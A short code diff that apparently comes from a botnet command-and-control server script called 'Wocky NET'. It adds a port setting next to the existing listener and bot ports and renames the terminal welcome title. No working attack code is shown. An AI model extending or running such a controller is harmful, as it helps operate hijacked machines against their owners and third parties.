@@ -23,6 +23,7 @@ buffer_length = 1024
 host = "0.0.0.0"
 port = 422
 bot_port = 446
+c_port = 477
 bots = [ ]
 
 cp_hostname = "\rQuantum >>: "
@@ -34,7 +35,7 @@ Discord.send_news(f"Wocky NET Successsfully started!\r\n```Port {port}```")
 def handle_connection(client, addr):
         # try:
         CLI_Control.set_TerminalSize(client, 40, 79)
-        CLI_Control.set_Title(client, "Welcome to Society NET!")
+        CLI_Control.set_Title(client, "Welcome to Wocky NET!")
         MainScreen(client, addr)
         while(True):
                 CMDHandler(client, addr)
